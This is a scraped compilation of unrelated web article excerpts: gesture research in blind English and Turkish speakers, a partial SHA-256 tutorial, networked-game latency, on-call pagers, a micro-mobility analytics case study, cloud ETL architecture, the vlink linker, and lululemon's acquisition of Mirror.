href="https://t.umblr.com/redirect?z=https%3A%2F%2Fscholar.google.co.uk%2Fscholar%3Fhl%3Den%26q%3DExpressing%2Bmanner%2Band%2Bpath%2Bin%2BEnglish%2Band%2BTurkish%253A%2BDifferences%2Bin%2Bspeech%252C%2Bgesture%252C%2Band%2Bconceptualization.%26btnG%3D%26as_sdt%3D1%252C5%26as_sdtp%3D&amp;t=N2I4ZTYyZmU0ZTFlOWY3NjMwYzliYjNiNjQ3MTQyZWJmNGJjZThhMCxqY2RYbFZ2Qw%3D%3D&amp;b=t%3A0DQa0-vgmaHanljYXgHk5w&amp;p=https%3A%2F%2Fwww.superlinguo.com%2Fpost%2F149950073272%2Fblind-people-gesture-and-why-thats-kind-of-a-big&amp;m=0" target="_blank">consistently gesture differently</a> when talking about videos of items moving. English speakers will be more likely to show the manner (e.g. ‘rolling’ or bouncing’) and trajectory (e.g. ‘left to right’, ‘downwards’) together in one gesture, and Turkish speakers will show these features as two separate gestures. This reflects the fact that English ‘roll down’ is one verbal clause, while in Turkish the equivalent would be<i> yuvarlanarak iniyor</i>, which translates as two verbs ‘rolling descending’. <br></p><p>Since we know that blind people <i>do</i> gesture, Özçalışkan’s team wanted to figure out if they gestured like other speakers of their language. Did the blind Turkish speakers separate the manner and trajectory of their gestures like their verbs? Did English speakers combine them? Of course, the standard methodology of showing videos wouldn’t work with blind participants, so the researchers built three dimensional models of events for people to feel before they discussed them.<br></p><p>The results showed that blind Turkish speakers gesture like their sighted counterparts, and the same for English speakers. All Turkish speakers gestured significantly differently from all English speakers, regardless of sightedness. This means that these particular gestural patterns are something that’s deeply linked to the grammatical properties of a language, and not something that we learn from looking at other speakers. <br></p><p><b>References</b><br></p><p>Jana M.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>SHA-2 (Secure Hash Algorithm 2), of which SHA-256 is a part, is one of the most popular <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hashing algorithms</a> out there. In this article, we are going to break down each step of the algorithm as simple as we can and work through a real-life example by hand.</p>



<p>SHA-2 is known for its security (it hasn’t <a aria-label="undefined (opens in a new tab)" href="https://shattered.io/" target="_blank" rel="noreferrer noopener">broken down like SHA-1</a>), and its speed. In cases where <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">keys are not being generated</a>, such as mining Bitcoin, a fast hash algorithm like SHA-2 often reigns supreme.</p>



<h2><span id="What_Is_a_Hash_Function">What Is a Hash Function?</span>
</h2>



<p>If you want to read more about hash functions in general, do so <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">here</a>. That said, in order to move forward let’s recap three of the main purposes of a hash function:</p>



<ul>
<li>To scramble data deterministically</li>
<li>To accept input of any length and output a fixed-length result</li>
<li>To irreversibly manipulate data. The input can’t be derived from the output</li>
</ul>
<h2><span id="SHA-2_vs_SHA-256">SHA-2 vs SHA-256</span>
</h2>



<p>SHA-2 is an <em>algorithm</em>, a generalized idea of how to hash data. SHA-256 sets additional constants that define the SHA-2 algorithm’s behavior. One such constant is the output size. “256” and “512” refer to their respective output digest sizes in bits.</p>



<p>Let’s step through an example of SHA-256.</p>



<h2><span id="SHA-256_hello_world_Step_1_-_Pre-Processing">SHA-256 “hello world”; Step 1 – Pre-Processing</span>
</h2>



<ul><li>Convert “hello world” to binary:</li></ul>

            What's Polygon Crest?</h2>
          <p>
            This program is a polygon editor. Maybe more commonly called a 
			polygon modeler. You can call whichever comfortable for you. The 
			main purpose is to build aircraft and ground visual models for YS 
			FLIGHT SIMULATOR, but you can use it for making general polygonal 
			models. If you make a correct solid model, you can export the data 
			for 3D printing, for example. I wanted to make it easy to create 
			aircraft models, so this program can quickly make a popular 
			airfoils, and extrude along the wing leading and trailing edges. It 
			also has basic boolean operations and rounding functions as well.

<h3>[ 2020-July-14 10:46 ]</h3>
<p>A few years ago I was fascinated by how network games worked after reading a <a href="https://gafferongames.com/post/introduction_to_networked_physics/">series of articles about Networked Physics that includes some great demo movies</a>. I didn't really understand it. How can the game be playable, when the client and server are separated by approximately 100 ms of network delay? I decided to create a small demo of a networked game, to try and figure it out. However, like most projects I start, I abandoned it after spending a few hours on it. I rediscovered it a couple months ago, and got it to a reasonabl y "finished" state. <a href="https://www.evanjones.ca/network-game-simulation-demo.html">The demo shows the client and server state of a "game"   and lets you adjust the simulated latency</a>. This gave me a huge appreciation for clever tricks used to create fast-paced games that are playable over the Internet. In particular, I find it amazing that the clients are playing the game either in the past or the future, but it still works to create an interactive experience.</p>


<h2>Local latency</h2>
<p>One important lesson is that even a local game has latency. Let's ignore things like <a href="https://danluu.com/keyboard-latency/">keyboard latency</a> or <a href="https://pcmonitors.info/articles/factors-affecting-pc-monitor-responsiveness/">display latency</a>, each of which can easily add ~50 ms of delay. Let's just consider the game loop, which involves reading input, simulating the world, then drawing the world. This means after a button press arrives, the game will not respond until the next frame. Many displays can show a maximum of 60 frames per second (FPS), which translate to an average of 8 ms of delay (uniformly distributed between 0-16 ms). That initial frame also might just register "player is moving forward", but won't actually move the player forward until the next frame, so that means it can be up to 33 ms between when you pressed the button and see a change. Many games run slower than that, which scales up the delay. The conclusion is that even that "fast" reaction you get in a local game is not instantaneous, and may actually have approximately 100 ms delay between inputs and seeing an update.</p>

<h2>No prediction: playing in the past</h2>
<p>The simplest network game model, and the one that is implemented in my demo, is to have the client send commands to the server, and have the server send state back to the client, which displays them. With this implementation, when you press a button to take an action, like moving forward, it takes one entire network round trip before you see the movement. The initial versions of Doom and Quake used this approach, because they were designed for local networks and not the Internet. Quake was released just when home Internet was becoming widespread, and people did play over the Internet anyway, which only worked if the network round trip time was low. With my demo, this feels playable up to about 50 ms of one-way latency.</p>

<p>The most interesting part to me is this means players are playing the game in the past, when compared to the server state. I've drawn the diagram below in an attempt to describe what I mean. Both the client and server start the game at the same instant, <code>t=0</code>. At this time, the player presses the "move forward" button, so the client sends this message to the server. It takes one time unit/frame to get to the server, so at t=1, the server receives and processes the button press. At t=2 the server simulates the player moving forward one unit, and sends the state to the client. Finally, at t=3 the client receives the updated position displays it. This means the client's display was updated at t=3, instead of t=1 in the "local" version. This is delayed by one network round trip time (2 units in this example). At any instant, the client is one time unit behind the server, which is what I mean that the game is being played in the past.</p>

<p><img alt="no prediction diagram" height="361" src="https://www.evanjones.ca/network-game-simulation-past.svg" width="703"></p>

<p>When I experiment with moving and firing in my simulation, I think I can notice even a small amount of latency. However, I feel like I can adapt to it and the game is playable up to about 50 ms. Above that point, it starts to feel "impossibly" slow and really unpleasant. This means this simple simulation will only work for physically "close" players. From my home connection in New York City to Google Cloud's data centers as measured by <a href="http://gcpping.com/">gcpping.com</a>, I can only play games hosted on the eastern half of North America (Virgina, South Carolina, and Montreal).</p>

<h2>Prediction: playing in the future</h2>
<p>To hide the effects of latency, modern games predict the effect of their actions. As a result, clients are now in the future, rather than in the past. Let's reconsider our example, where a game starts and a player immediately starts moving forward, shown below. In the first instant, the client processes the move forward command, so it sends it to the server. In the next instant, the client predicts moving forward one step, and the server receives the message. In the second instant (t=2), the client has predicted moving forward another step. The server simulates the movement and sends the "official" state. In the next instant (t=3), the client receives the confirmation that the user did move forward. The tricky part is the client needs to decide if this agrees with its simulation. If it does not, then it needs to "rewind" its simulation, and replay its local actions again.</p>

<p><img alt="with prediction diagram" height="358" src="https://www.evanjones.ca/network-game-simulation-future.svg" width="700"></p>

<p>With client-side prediction, the time between an input and a display update is the as a local game. However, the client is ahead of the server's "real" state by one network delay, which is what I mean that it is playing in the future.</p>

<h2>Further reading</h2>
<p>I am not an expert on this subject, since I have never worked in games. If you want to learn more, you should read about how real games make this work.</p>

		<div><p><img alt="pager" src="https://www.roguelazer.com/images/2019-06-13-pager.png"></p>
<p>I've been on-call for most of the last 11 years. I was on-call for the CS Department at Mudd<sup id="fnref:csdept"><a href="#fn:csdept">1</a></sup>. I was on-call at
Yelp, in a rotation that at times contained as few as three people. I was on-call at Uber in rotations ranging from one
to twenty people. And I've been on-call at EasyPost — initially in a rotation with one other person<sup id="fnref:epdouble"><a href="#fn:epdouble">2</a></sup>, and
currently with two other people. I have responded to tens of thousands of pages. I have been woken up in the middle of
the night hundreds<sup id="fnref:hundreds"><a href="#fn:hundreds">3</a></sup> of times. For the last seven or so years, I've worked at firms where on-call was a <acronym title="Bring Your Own Device">BYOD</acronym> kind of a deal — you bring your own cell phone, register it in
<a href="https://www.pagerduty.com/">PagerDuty</a>, and that's how you handle being on-call. This is my ode to the unfairly-hated pager, to
the practices of yore.</p>
<p>Let's look at the phone you have in your pocket right now<sup id="fnref:nodevice"><a href="#fn:nodevice">4</a></sup>:</p>
<ul>
<li>It runs iOS or Android<sup id="fnref:ios"><a href="#fn:ios">5</a></sup></li>
<li>It gets at most two days of battery life</li>
<li>It receives phone calls, of which at least 90% are robots saying things like <q>Hey buddy, this call is from the Department of Social Security</q></li>
<li>When it's not getting phone calls, it's constantly begging for your attention with notifications, most of which are some degree of spam</li>
</ul>
<p>Is <em>this</em> the device you want to have to have on and audible 24 hours a day, 365 days a year? Do you love the idea of
Apple's <em>Do Not Disturb</em> feature? Well, screw you because PagerDuty might need to reach you at any instant<sup id="fnref:dnd"><a href="#fn:dnd">6</a></sup>. Do you miss
going out into the woods for a hike? Too bad, Apple had to shave 0.7mm off the latest iPhone so now the antenna only
works if it has direct line of sight to the AT&amp;T worldwide headquarters in Dallas, TX. Want to quickly see what you're
getting paged about? I hope you like watching this brief animation as all your icons <em>swoosh</em> in from whatever armpit
of the universe they spend the off-time drinking in before you can actually do anything. Oh, you're using the native
PagerDuty app? Well, then, you've got to give it 10 seconds to load (despite the fact that the Apple A12 CPU in your
phone is faster than <strong>any computer CPU that existed anywhere on the planet 10 years ago</strong>) so that it can render some
emojis and prompt you to take an "On-Call Selfie"<sup id="fnref:selfie"><a href="#fn:selfie">7</a></sup>.</p>
<p>My ideal on-call device would look something like the following:</p>
<ul>
<li>Small and lightweight</li>
<li>Extremely long battery life (imagine… weeks without recharging)</li>
<li>Only capable of receiving emergency notifications from PagerDuty so I can leave it on, unmuted at all times</li>
<li>On a network with great distance and building penetration<sup id="fnref:5G"><a href="#fn:5G">8</a></sup></li>
<li>Maybe a one or two line black-and-white display just long enough to print out messages like <code>CRITICAL: web1sf - 4 packets transmitted, 0 received, 100% packet loss</code></li>
<li>Maybe two buttons so you could acknowledge or escalate incidents — but maybe not; I'm probably going to grab a laptop or bigger device to actually do the investigation<sup id="fnref:onedevice"><a href="#fn:onedevice">9</a></sup></li>
</ul>
<p>Do you know what I've just described, you bunch of ingrates? You damned dirty apes? A bona fide <strong>two-way pager</strong>. We had the technology! We had
built the perfect system! And we destroyed it! In our frivolous pursuit of only carrying one device, in our employers'
endless pursuit of simpler procurement, we got rid of a system where your employer provides a simple-to-use
single-function device to you, the employee, and replaced it with a system where you bring your own massively
over-complicated device, pay your own connectivity bills, and then miss pages at 3 in the morning because you got too
many goddamn Farmville notifications and your battery died.</p>

                    <h2 id="an-introduction-to-our-partner-">An introduction to our Partner:</h2><p>Locale recently worked with a scooter sharing company that helps users commute using their fleet of scooters and bikes. With their rapid growth, large user base, and wonderful review, they have become the face of the growing micro-mobility ecosystem in South Asia. In 2019, they reached a significant milestone of 60,000 rides per day in Bengaluru, making it the fastest-growing bike-sharing start-up in the world. </p><p>Let us take you through how the team<strong><strong> </strong></strong>used <strong><strong><a href="https://locale.ai/">Locale.ai</a> </strong></strong>to open their stations in 7 cities as part of a new initiative by the company, decrease user churn by 9% and attain operational efficiency.</p><h2 id="the-business-problem-s-">The Business Problem(s)</h2><p>To make any important operational decision using geo-data, executives and decision makers have to rely on the data provided by the engineering teams. The case was very similar with our partner too. Their business model was a docked model- where any user (like you or me) could pick up a bike from a station and drop it off to another station.</p><p>As they were rapidly expanding in new cities (pre-COVID), the business problems were to:</p><ul><li>Decide where to open new stations to service demand</li><li>Close stations that were not performing well</li></ul><figure><img src="https://blog.locale.ai/content/images/2020/06/OperationalInsights-1.png"><figcaption>Locale.ai Console</figcaption></figure><p><br>The team wanted to ensure that they could capitalize on latent demand present in certain areas and expand their presence as well as minimise user churn by getting better insights into user behaviour and making a strategy accordingly.</p><p>Meanwhile, they were also trying to ensure that the time and resources in building dashboards could be used in some other avenue so that they could grow more rapidly. That’s where they were looking for a tool to convert location data into insights that can aid business decisions.</p><h3 id="before-we-move-on-a-bit-about-locale-ai">Before we move on, a bit about Locale.ai</h3><p>Locale is your one-stop destination for anything that involves analyzing hyperlocal operations. Imagine a tool built for city teams, ops teams &amp; logistics teams empowering them to get answers to their questions without depending on any engineering or analyst bandwidth.</p><p>We ensure that a large chunk of location data collected from your users or your vehicle sensors, that might otherwise remain unused, can now be used to create meaningful insights that help business teams make quick, data-driven decisions.</p><h2 id="the-how-s-why-s-of-the-solution">The How's &amp; Why's of the Solution</h2><p>The questions that the team asked to make the following decisions:</p><h3 id="expansion-new-stations">Expansion &amp; New Stations</h3><ul><li>Which areas are users downloading the app or searching for bikes?</li><li>Which areas are users churning out [searching but not booking]?</li><li>What is the distance of areas with high churn density with current stations?</li></ul><figure><img src="https://blog.locale.ai/content/images/2020/06/New-Static-Entity-overview.png"><figcaption>Locale.ai: Station Console</figcaption></figure><h3 id="shutting-down-stations"><strong><strong>Shutting Down Stations</strong></strong></h3><ul><li>Which stations are usually facing a high rate of cancellations?</li><li>Which stations have a very high idle time for the bikes?</li><li>Which stations are located near low demand areas?</li></ul><h3 id="making-insights-actionable">Making Insights Actionable</h3><p>At Locale, we consider ourselves successful only when we help companies take more precise and data-driven decisions using our product.

They would send a couple of these lat-longs to their individual city teams who would find the most optimal location on ground, owing to the constraints.</p><p>With our commenting feature, they would coordinate internally on whether the station was opened in that location. If not, what were the possible reasons?</p><h3 id="the-impact">The Impact</h3><p>But, with all these decisions, what was the actual business impact and how did we move business metrics?</p><blockquote>Since the team started using our product, we saw a 9% reduction in user churn and improvement in user satisfaction.</blockquote><p>What this translates to is users who could previously not book a bike because of unavailability of bikes, or bikes being far off can now hop on a nearby bike and start their rides, which resulted in an improvement in user delight.</p><hr><h2 id="the-use-cases-of-locale-in-micro-mobility-">The Use Cases of Locale in Micro-Mobility:‌‌</h2><figure><img src="https://blog.locale.ai/content/images/2020/07/image-6.png"></figure><p>Analysts at McKinsey have evaluated the shared micro mobility industry to cross over <a href="https://www.mckinsey.com/industries/automotive-and-assembly/our-insights/micromobilitys-15000-mile-checkup#">$300 Billion by 2030</a>. But how can companies today reach there? What stops companies from realizing their potential? Inertia in expanding to newer locations? Problems with fleet management? Inaccuracy in gauging demand? A mixture of all these problems often cap the growth of a company.</p><p>Let us explore these problems one by one.</p><ol><li><strong><strong>Expansion</strong></strong>: Metrics such as user bookings, cancellations, distribution of sales and churn helps companies understand the spread of demand and supply across cities.</li><li><strong><strong>Station Performance:</strong></strong> Idle time of bikes, churn density around the stations and cancellations help companies decide where to set up new stations and which stations to shut down.</li><li><strong><strong>User Acquisition:</strong></strong> It is important to understand the behaviour of frequent users, which routes they travel and how they can increase user acquisition along those routes via targeted offline and route-based campaigns.</li><li><strong><strong>Fleet Management:</strong></strong> Issues such as vandalism, incomplete drop-offs, and breakdowns need to be tracked in real time and it helps companies to get immediate notifications for abnormal behaviour of KPIs.‌‌</li></ol><p>Often, companies search for tools that can be used to solve these problems for them, by using their location data. Luckily, that's exactly what we love to do!‌‌ If you work in the micro-mobility or ride-sharing industry, contact us to set up your Locale today. ‌‌</p><p><em><em><em><em>To know more, g<em><em><em><em>et in touch with me on </em></em></em></em></em></em></em></em><a href="https://www.linkedin.com/in/aditi-sinha-6b774ba9/" rel="noopener nofollow"><em><em><em><em><em><em><em><em>LinkedIn</em></em></em></em></em></em></em></em></a><strong><strong><strong><strong><strong><strong><strong><strong><em><em><em><em><em><em><em><em> </em></em></em></em></em></em></em></em></strong></strong></strong></strong></strong></strong></strong></strong><em><em><em><em><em><em><em><em>or </em></em></em></em></em></em></em></em><a href="https://twitter.com/aditi1002" rel="noopener nofollow"><em><em><em><em><em><em><em><em>Twitter</em></em></em></em></em></em></em></em></a><strong><strong><strong><strong><strong><strong><strong><strong><em><em><em><em><em><em><em><em>.</em></em></em></em></em></em></em></em></strong></strong></strong></strong></strong></strong></strong></strong></p><h3 id="read-similar-">Read Similar:</h3><figure><a href="https://blog.locale.ai/how-micromobility-used-locale-ai-to-reduce-user-churn/"><div><p>How India’s Top Micro-Mobility Player Used Locale.ai to Reduce User Churn by 9%</p><p>A step-by-step guide on how they used Locale.ai to set up their stations</p><p><img src="https://blog.locale.ai/favicon.png"><span>Aditi Sinha</span><span>The Locale.ai Blog</span></p></div><p><img src="https://blog.locale.ai/content/images/2020/07/SAE_IT.jpg"></p></a></figure><figure><a href="https://blog.locale.ai/mapping-kpis-with-location-data-for-ride-hailing-companies-using-locale-ai/"><div><p>Key Metrics for Ride-Hailing Companies using Location Data</p><p>Use location intelligence to create heatmaps for your critical business&nbsp;metrics with Locale</p><p><img src="https://blog.locale.ai/favicon.png"><span>Aditi Sinha</span><span>The Locale.ai Blog</span></p></div><p><img src="https://blog.locale.ai/content/images/2020/05/1_C0WaSy2Lt-sdpynFMI8j4A.png"></p></a></figure>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Data Integration is a critical engineering system in all Enterprises. Initially, it started with ad hoc <strong>scripts</strong>, which got replaced by <strong>Visual ETL</strong> tools such as Informatica, AbInitio, DataStage, and Talend. To cope with an explosion in data, consumer companies such as Google, Yahoo, and LinkedIn developed new <strong>data engineering</strong> systems based on commodity hardware. The usability of these systems was quite low, and the developer needed to be much more aware of the performance. <strong>Apache Spark</strong> has broken through from this clutter with thoughtful interfaces and product innovation, while <strong>Hadoop</strong> has effectively gotten <strong>disaggregated</strong> in the cloud and become a legacy technology.</p><p>Now, as Enterprises transition to the cloud, often they are developing expertise in the cloud ecosystem at the same time as trying to make decisions on the product and technology stack they are going to use. </p><p>In the rest of the blog, we'll take a look at the two primary processing paradigms for data integration, and their cloud equivalents.</p></div><h2>What is Data Integration (or ETL)</h2><p>Data Integration is your Data Factory. It reads data from various <strong>input sources</strong> such as Relational Databases, Flat Files, and Streaming. It then does various <strong>transformations</strong> on the data such as joining and de-duplicating data, standardizing formats, pivoting, and aggregating. Once the data is ready for analytics (such as in star schemas), it is <strong>stored or loaded</strong> into the target which is typically a Data Warehouse or a Data Lake.</p><p><img src="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%20%20graphic.png" srcset="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%2520%2520graphic-p-1080.png 1080w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%2520%2520graphic-p-1600.png 1600w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a891eba4f265f06523789_ETL%20%20graphic.png 1755w" sizes="(max-width: 479px) 87vw, (max-width: 991px) 92vw, 780px" alt=""></p><h2>The Two On-Premises Execution Paradigms</h2><p>For most large Enterprises and companies rich in data, &nbsp;one server will be insufficient to execute the workloads, and thus, parallel processing is required. For this, there have historically been two primary methods:</p><ul role="list"><li><strong>ETL Execution Engine Processing</strong> - here the ETL tool comes with a distributed high performance execution engine. Most of the processing happens in this execution engine, and after the data is ready for analytics, it is loaded into a data warehouse. <strong>AbInitio</strong> is a good example and is the market leader in performance.</li><li><strong>Data Warehouse Pushdown Processing</strong> - here the ETL tool comes with a single server execution engine. Since it cannot do high volume processing, it provides pushdown processing that pushes computations down to the Data Warehouse and leverages the distributed processing engine there. In the field, we see <strong>Informatica</strong> commonly deployed with <strong>Teradata</strong> this way, though Informatica has a PowerCenter Grid product as well.</li></ul><p><img src="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%20execution%20graphic.png" srcset="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-500.png 500w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-800.png 800w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-1080.png 1080w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%2520execution%2520graphic-p-1600.png 1600w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a89a09ea997b220276451_ETL%20execution%20graphic.png 1773w" sizes="(max-width: 479px) 87vw, (max-width: 991px) 92vw, 780px" alt=""></p><p>Two on-premises ETL Execution paradigms</p><h3>Which Architecture is Better?</h3><div><p>One natural question to ask is - <strong>whether one of these paradigms is preferable?</strong> The Answer is Yes!</p><p>The case for <strong>data warehouse ETL execution</strong> is that it reduces one system - ETL execution and data warehouse execution will both happen in Teradata. Also, most data warehouses are typically high-quality products. However, it's an <strong>expensive</strong> approach and <strong>not the right architectural fit</strong>. Data warehouses have an architectural focus on <strong>low latency</strong> since there is often a human analyst waiting for her BI query. For this, they collect high-quality statistics for query planning and have sophisticated caching mechanisms. This is not a great fit for ETL workloads where throughput is the most important factor, and there is no reuse, making caches and statistics useless. Often we've found that 70% of Teradata capacity was dedicated to ETL in Enterprises, and that is what got offloaded to Apache Hive. </p><p>On the other hand, high-quality parallel processing products, exemplified by AbInitio are perhaps the <strong>best solution</strong> - both in inherent processing cost and performance. Most users of AbInitio loved the product, but the high licensing cost has removed any architectural cost advantages they had and made them available to a very few of the largest Enterprises. </p><p>‍<strong>Cloud, with usage based pricing,</strong> is a great equalizer, let's look at how cloud is changing this equation...</p></div><h2>Cloud Transition - the two ETL Architectures</h2><p>There are two primary approaches to choose for your ETL or Data Engineering</p><ul role="list"><li><strong>Data Warehouse ETL Approach: </strong>This is an <strong><em>as-is</em></strong> migration of the on-premises approach, done in a cloud context. An example here, one can use <strong>Snowflake</strong> as the data warehouse instead of <strong>Teradata</strong> on-premises. Then you can use any ETL tool such as <strong>Informatica</strong> or <strong>Matillion</strong> on top and it will push down queries to Snowflake that will do the heavy lifting. If you have small datasets, this works. As discussed above, for large datasets and complex transformations this architecture is far from ideal. This is far from the world of open-source code on Git &amp; CI/CD that data engineering offers - again locking you into proprietary formats, and archaic development processes.</li><li><strong>Data Engineering Approach:</strong> Data Engineering based on Spark for the execution layer, merges the best of the previous generation in high performance, with the best of large scale commodity processing from consumer companies - such as Hadoop. If you use Databricks, it adds transactions from Data Warehouses via delta lake providing the best product in the cloud by a large margin. A product such as <strong>Prophecy</strong> adds the remaining functionality - code and visual drag-and-drop editing that generates code on Git, Metadata with lineage, Scheduling, and CI/CD, providing a complete stack that will free you from proprietary formats.</li></ul><div><p>The following image is how the Cloud Data Engineering architecture looks. The data from on-premise operational systems lands inside the data lake, as does the data from streaming sources and other cloud services. <strong>Prophecy with Spark</strong> runs data engineering or ETL workflows, writing data into a data warehouse or data lake for consumption.</p><p>Reports, Machine Learning, and a majority of analytics can run directly from your Cloud Data Lake, saving you a lot of costs and making it the single system of record. For particular BI use cases (fast interactive queries), Data Marts can be created on Snowflake or another Cloud Data Warehouse such as Redshift, BigQuery, or Azure SQL.</p></div><p><img src="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture.jpg" srcset="https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-500.jpeg 500w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-1080.jpeg 1080w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-1600.jpeg 1600w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture-p-2000.jpeg 2000w, https://assets.website-files.com/5ec3ebc95538f8302b8dcdf3/5f0a8b159ea997f6132766c4_cloud_architecture.jpg 2423w" sizes="(max-width: 479px) 87vw, (max-width: 991px) 92vw, 780px" alt=""></p><p>Cloud Data Engineering Architecture</p><h2>How to Choose?</h2><p>If you're moving you ETL to Data Engineering, you're deciding what your architecture for the next decade or more.</p><p>We recommend moving to Apache Spark and a product such as Prophecy. Apart from exceeding the capabilities of the Snowflake based stack at a much cheaper price point, this prevents you from getting locked into proprietary formats. You will also be able to deliver new analytics faster by embracing Git and continuous integration and continuous deployment - that is equally accessible to the Spark coders as well as the Visual ETL developers who have a lot of domain knowledge.</p></div></div>]]>

    <p>vlink is a portable linker, written in ANSI-C, that can read
    and write a wide range of object- and executable file formats.
    It can be used to link a specific target format from several
    different input file formats, or for converting, stripping
    and manipulating files.</p>
    <p>The linker can be controlled by GNU-style linker scripts to
    generate absolute code, but it also runs very well with
    default rules to create relocatable executables, as required
    for AmigaOS or MorphOS.</p>
    <p>Of course there might be technical restrictions that object
    files of different architectures cannot be merged because of
    incompatible relocation types, differing endianess or
    symbol-names with and without leading underscores. But in
    theory everything is possible!</p>

						<p>A few weeks back, lululemon acquired Mirror for $500M. When the news broke, we wrote&nbsp;<a href="https://insider.fitt.co/lululemon-acquires-mirror-500m/" target="_blank" rel="noopener">a quick analysis</a>&nbsp;of how the partnership might play out. Today, we’re going deeper to explore lulu’s ambitions, Mirror’s motivation for selling, and how, in hindsight, Nike, Peloton, and COVID-19 sealed the deal.</p>
<p><strong>TL;DR:</strong>&nbsp;Even if this acquisition doesn’t pan out, everybody wins. Here’s why.</p>

                      <h2>Calculated Risk</h2>
          
          <p>M&amp;A is a mixed bag. In the case of activewear retailers, buying into digital fitness via high-profile purchases has&nbsp;<a href="https://twitter.com/JoeVennare/status/1281301589190488064" target="_blank" rel="noopener">proven futile</a>. So why did lululemon, a fast-growing apparel company, roll the dice on Mirror? One word: Nike.</p>
<p>Nike is the king of activewear. Try as they might, foes like adidas, Reebok, and Under Armour are no match for the swoosh. For its part, lululemon hopes to become a worthy adversary — if for no other reason than to remain in the good graces of Wall Street. On both accounts, Mirror factors heavily into the equation.</p>
<p>Putting this competition into context, lululemon trails Nike by an order of magnitude. Nike has a $152B market cap. Over the last 12 months, they’ve done $37B in sales. Meanwhile, lulu’s market cap is $37B, and the company had revenues of $3.85B over the same period.</p>
<p>While shares of the yoga pant maker have outperformed Nike in recent years, lulu might not ever reach the scale of Nike. But beating Nike outright isn’t the point. Ultimately, lululemon is in competition with itself, where Nike represents the upper bounds of what’s possible.</p>

                      <h2>Just Keep Growing</h2>
          
          <p>To prove that they haven’t peaked, lululemon has one mandate: just keep growing.</p>
<p>Moving beyond the yoga niche and expanding its total addressable market, the company’s&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=96471d02c6" target="_blank" rel="noopener">five-year strategic plan</a>, released in April 2019, charted the path forward: “double men’s, double digital, and quadruple international” revenues. Add self-care products, a foray into footwear, and the opening of a 20,000-square-foot experiential store (complete with yoga studios and a restaurant) into the mix and grow they shall.</p>
<p>A few months later, in November of 2019, lululemon invested $1M into Mirror’s $34M Series B-1, a bargain for a foothold in connected fitness. As part of the investment, and in keeping with its goal of becoming an experiential brand, lululemon ambassadors began creating workout content for the Mirror platform.</p>
<p>Flash-forward to March: when COVID hit, the table was set. With retail stores shuttered and fitness studios closed, shopping and sweating moved online. In a few short weeks, lululemon had seen enough; they were ready to go all-in on Mirror.</p>
<ul>
<li>In the first week of store closures, 170K people joined lulu’s live workouts on Instagram.</li>
<li>Pre-COVID, 64% of lululemon guests used a digital workout option at home.</li>
<li>During the pandemic, as the coronavirus spread, that number jumped to 75%.</li>
<li>86% of lulu customers who used an at-home option during the outbreak plan to continue or increase their new digital workout habit.</li>
</ul>
<p>In April, lulu’s online sales surged&nbsp;<a href="https://www.cnbc.com/2020/06/11/lululemon-lulu-reports-fiscal-q1-2020-earnings.html" target="_blank" rel="noopener">125%</a>, a trend that’s expected to continue. Add in the fact that some 50% of Mirror users are also lululemon customers, and this deal checks a lot of boxes for the growth-focused retailer.</p>
        </div>

            <div>
        <div>
                      <h2>Why Mirror Sold</h2>
          
          <p>Last year, Mirror CEO Brynn Putnam told Fast Company she was building “the next iPhone.” Far from another connected fitness upstart, Mirror would be “the third screen in your life that you’re going to turn to for all immersive interactive experiences going forward.”</p>
<p>About seven months later, Putnam pulled the ripcord, selling her company amid a global pandemic — circumstances tailor-made for an immersive third screen.</p>
<p>So why did Mirror sell? lulu made an offer they couldn’t refuse. Putnam, a solo, female founder just secured a “W” for herself, her investors, and New York’s startup scene.</p>
<p>Beyond the obvious, it’s fair to ask,&nbsp;<em>why now?</em>&nbsp;In many ways, Peloton forced Putnam’s hand.</p>
<p>Pitching Mirror as the “next iPhone” was a strategic move that 1.) established a big vision worthy of $70M+ in funding, and 2.) helped the company duck the question, “how do you compete with Peloton?” Their answer was simple — we don’t.</p>
<p>When COVID hit, Mirror was pigeonholed. They weren’t the third screen, they were in direct competition with Peloton. And despite surging sales, Mirror’s growth pales in comparison to Peloton’s. Plus, there’s&nbsp;<a href="https://www.linkedin.com/posts/joevennare_fitness-startups-activity-6679025786697117697-YuI5" target="_blank" rel="noopener">a growing list of Mirror-like competitors</a>&nbsp;hitting the market. All of a sudden, an interactive screen didn’t feel all that innovative, or defensible.</p>
<p>Meanwhile, digital fitness companies are raking in funding. Hydrow, Aaptiv, and NEOU recently closed investments as Tonal and Tempo target new funds. If Mirror considered raising on the back of its COVID boost, they’d have to become a customer acquisition and retention machine, where every move is audited in relation to Peloton’s now public (and soaring) metrics.</p>
